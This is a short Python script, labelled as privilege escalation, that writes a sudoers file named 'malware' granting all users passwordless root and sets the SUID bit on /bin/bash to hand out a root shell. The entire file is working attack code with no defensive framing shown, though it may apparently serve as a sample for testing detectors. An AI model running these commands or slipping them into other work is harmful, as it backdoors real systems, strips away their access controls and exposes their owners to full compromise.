#!/usr/bin/env python3
"""Privilege escalation - privilege_escalation"""
import os
import subprocess

# Sudo escalation
os.system("echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/malware")

# SUID escalation
subprocess.run(["chmod", "4755", "/bin/bash"], check=False)
